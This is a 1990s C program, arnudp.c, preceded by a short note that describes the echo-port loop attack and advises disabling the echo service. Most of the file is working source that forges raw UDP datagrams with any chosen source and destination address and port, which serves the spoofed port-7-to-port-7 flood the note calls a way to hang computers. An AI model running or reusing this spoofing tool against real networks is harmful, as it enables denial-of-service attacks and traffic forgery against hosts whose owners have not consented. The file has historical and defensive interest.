

/*

From B.O.S. 2/05/96

I noticed someone mentioning the echo port. My advice is to disable the 
echo service completely. It is often used by hackers to hang a computer.

Try sending a packet from port 7 your ip to port 7 your ip.

The system will bounce the packet back and forth slowing the system 
drastically.

A Hacker Program I have seen used to do this is called arnudp.c 

*/

/************************************************************************/
/* arnudp.c version 0.01 by Arny - cs6171@scitsc.wlv.ac.uk		*/
/* Sends a single udp datagram with the source/destination address/port	*/
/* set to whatever you want.  Unfortunately Linux 1.2 and SunOS 4.1	*/
/* don't seem to have the IP_HDRINCL option, so the source address will	*/
/* be set to the real address.  It does however work ok on SunOS 5.4.	*/
/* Should compile fine with just an ANSI compiler (such as gcc) under	*/
/* Linux and SunOS 4.1, but with SunOS 5.4 you have to specify extra	*/
/* libraries on the command line:					*/
/* 	/usr/ucb/cc -o arnudp arnudp001.c -lsocket -lnsl		*/
/* I'll state the obvious - this needs to be run as root!  Do not use	*/
/* this program unless you know what you are doing, as it is possible	*/
/* that you could confuse parts of your network	/ internet.		*/
/* (c) 1995 Arny - I accept no responsiblity for anything this does.	*/
/************************************************************************/
/* I used the source of traceroute as an example while writing this.	*/
/* Many thanks to Dan Egnor (egnor@ugcs.caltech.edu) and Rich Stevens	*/
/* for pointing me in the right direction.				*/
/************************************************************************/
 
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in_systm.h>
#include<netinet/in.h>
#include<netinet/ip.h>
#include<netinet/udp.h>
#include<errno.h>
#include<string.h>
#include<netdb.h>
#include<arpa/inet.h>
#include<stdio.h>

struct sockaddr sa;

udpdata_main(int argc,char **argv)
{
int fd;
int x=1;
struct sockaddr_in *p;
struct hostent *he;
u_char gram[38]=
	{
	0x45,	0x00,	0x00,	0x26,
	0x12,	0x34,	0x00,	0x00,
	0xFF,	0x11,	0,	0,
	0,	0,	0,	0,
	0,	0,	0,	0,

	0,	0,	0,	0,
	0x00,	0x12,	0x00,	0x00,

	'1','2','3','4','5','6','7','8','9','0'
	};

if(argc!=5)
	{
	fprintf(stderr,"usage: %s sourcename sourceport destinationname destinationport\n",*argv);
	exit(1);
	};

if((he=gethostbyname(argv[1]))==NULL)
	{
	fprintf(stderr,"can't resolve source hostname\n");
	exit(1);
	};
bcopy(*(he->h_addr_list),(gram+12),4);

if((he=gethostbyname(argv[3]))==NULL)
	{
	fprintf(stderr,"can't resolve destination hostname\n");
	exit(1);
	};
bcopy(*(he->h_addr_list),(gram+16),4);

*(u_short*)(gram+20)=htons((u_short)atoi(argv[2]));
*(u_short*)(gram+22)=htons((u_short)atoi(argv[4]));

p=(struct sockaddr_in*)&sa;
p->sin_family=AF_INET;
bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));

if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)
	{
	perror("socket");
	exit(1);
	};

#ifdef IP_HDRINCL
fprintf(stderr,"we have IP_HDRINCL :-)\n\n");
if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)
	{
	perror("setsockopt IP_HDRINCL");
	exit(1);
        };
#else
fprintf(stderr,"we don't have IP_HDRINCL :-(\n\n");
#endif

if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct sockaddr)))== -1)
	{
	perror("sendto");
	exit(1);
	};

printf("datagram sent without error:");
for(x=0;x<(sizeof(gram)/sizeof(u_char));x++)
	{
	if(!(x%4)) putchar('\n');
	printf("%02x",gram[x]);
	};
putchar('\n');

}
